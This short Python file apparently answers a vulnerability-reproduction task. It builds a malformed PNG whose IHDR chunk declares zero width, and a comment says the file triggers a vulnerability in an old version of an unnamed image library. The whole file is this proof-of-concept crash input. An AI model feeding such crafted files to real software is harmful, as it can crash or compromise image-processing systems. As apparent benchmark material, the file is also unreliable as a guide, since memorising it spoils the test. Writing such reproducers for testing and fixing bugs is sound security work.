import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def png_chunk(chunk_type: bytes, data: bytes) -> bytes:
            length = struct.pack(">I", len(data))
            crc = zlib.crc32(chunk_type)
            crc = zlib.crc32(data, crc)
            crc = struct.pack(">I", crc & 0xFFFFFFFF)
            return length + chunk_type + data + crc

        def create_png_zero_width(height: int = 4, color_type: int = 0, bit_depth: int = 8, interlace: int = 0) -> bytes:
            # PNG signature
            png_sig = b"\x89PNG\r\n\x1a\n"
            # IHDR: width=0 triggers the vulnerability in the old version
            ihdr_data = struct.pack(">IIBBBBB", 0, height, bit_depth, color_type, 0, 0, interlace)
            ihdr = png_chunk(b"IHDR", ihdr_data)
            # IDAT: for width=0, each row has only the filter byte -> height bytes total
            idat_payload = zlib.compress(b"\x00" * height)
            idat = png_chunk(b"IDAT", idat_payload)
            iend = png_chunk(b"IEND", b"")
            return png_sig + ihdr + idat + iend

        # Construct a minimal PNG with zero width and small height; grayscale, non-interlaced
        return create_png_zero_width(height=4, color_type=0, bit_depth=8, interlace=0)
